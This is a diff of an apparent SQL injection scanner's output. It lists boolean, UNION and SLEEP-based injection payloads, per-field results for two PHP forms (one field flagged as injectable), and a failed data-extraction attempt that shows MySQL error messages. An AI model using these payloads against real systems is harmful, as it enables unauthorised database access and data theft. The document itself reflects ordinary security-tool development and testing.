@@ -23,39 +23,47 @@
 
 === Check: boolean, with: 
 
-       -> ' AND 1=1 -- 
-       -> ' AND 1=2 --
+       -> ' AND 1=1 --  
+       -> ' AND 1=2 -- 
 
 
 === Check: union, with: 
 
-       -> ' UNION SELECT NULL-- 
-       -> ' UNION SELECT NULL, NULL-- 
-       -> ' UNION SELECT NULL, NULL, NULL--
-
-
-=== Check: sleep, with: 
-
-       -> 1' AND SLEEP(5)--
+       -> ' UNION SELECT NULL --  
+       -> ' UNION SELECT NULL, NULL --  
+       -> ' UNION SELECT NULL, NULL, NULL -- 
 
 
 == Form tested: userinfo.php
 
-+-------+-------+---------+-------+-------+
-| Input | error | boolean | union | sleep |
-+-------+-------+---------+-------+-------+
-| uname |       |         |   V   |       |
-|  pass |       |         |       |       |
-+-------+-------+---------+-------+-------+
++-------+-------+---------+-------+
+| Input | error | boolean | union |
++-------+-------+---------+-------+
+| uname |       |         |   V   |
+|  pass |       |         |       |
++-------+-------+---------+-------+
 
 
 == Form tested: search.php?test=query
 
-+-----------+-------+---------+-------+-------+
-|   Input   | error | boolean | union | sleep |
-+-----------+-------+---------+-------+-------+
-| searchFor |       |         |       |       |
-+-----------+-------+---------+-------+-------+
+NO VULNERABILITY FOUND
 
+======================================================================
+                           DATA EXTRACTION                            
+======================================================================
+
+==> ENGINE: SQLite
+
+==> TABLES
+
+Error: Table 'acuart.sqlite_master' doesn't exist
+
+==> COLUMNS
+
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sql FROM sqlite_master WHERE name='users' -- ' AND pass='test'' at line 1
+
+==> FULL DUMP
+
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sql, '|') FROM sqlite_master WHERE type='table'--' AND pass='test'' at line 1
 
     ---------------------------- END ----------------------------     
